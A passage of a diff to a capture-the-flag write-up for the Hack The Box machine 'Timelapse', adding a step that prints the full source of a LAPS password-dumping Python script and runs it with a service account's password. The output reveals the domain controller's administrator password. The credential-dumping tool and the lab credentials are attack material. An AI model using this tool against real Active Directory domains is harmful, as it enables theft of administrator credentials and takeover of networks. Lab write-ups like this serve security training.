@@ -369,5 +369,48 @@ get-aduser -filter * -properties *
 exit
 ```
 
+Add `10.10.11.152 timelapse.htb` to /etc/hosts then we can use [laps.py](https://raw.githubusercontent.com/n00py/LAPSDumper/main/laps.py)
+
+```
+[connor@fedora timelapse]$ cat laps.py 
+#!/usr/bin/env python3
+from ldap3 import ALL, Server, Connection, NTLM, extend, SUBTREE
+import argparse
+
+parser = argparse.ArgumentParser(description='Dump LAPS Passwords')
+parser.add_argument('-u','--username',  help='username for LDAP', required=True)
+parser.add_argument('-p','--password',  help='password for LDAP (or LM:NT hash)',required=True)
+parser.add_argument('-l','--ldapserver', help='LDAP server (or domain)', required=False)
+parser.add_argument('-d','--domain', help='Domain', required=True)
+
+def base_creator(domain):
+    search_base = ""
+    base = domain.split(".")
+    for b in base:
+        search_base += "DC=" + b + ","
+    return search_base[:-1]
 
 
+def main():
+    args = parser.parse_args()
+    if args.ldapserver:
+        s = Server(args.ldapserver, get_info=ALL)
+    else:
+        s = Server(args.domain, get_info=ALL)
+    c = Connection(s, user=args.domain + "\\" + args.username, password=args.password, authentication=NTLM, auto_bind=True)
+    try:
+        c.search(search_base=base_creator(args.domain), search_filter='(&(objectCategory=computer)(ms-MCS-AdmPwd=*))',attributes=['ms-MCS-AdmPwd','SAMAccountname'])
+        for entry in c.entries:
+                print (str(entry['sAMAccountName']) +":"+ str(entry['ms-Mcs-AdmPwd']))
+    except Exception as ex:
+        if ex.args[0] == "invalid attribute type ms-MCS-AdmPwd":
+                print("This domain does not have LAPS configured")
+        else:
+                print(ex)
+
+    
+if __name__ == "__main__":
+    main()
+[connor@fedora timelapse]$ python laps.py -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb
+DC01$:[},r9L86NT,/%+gE]).61X-9
+```
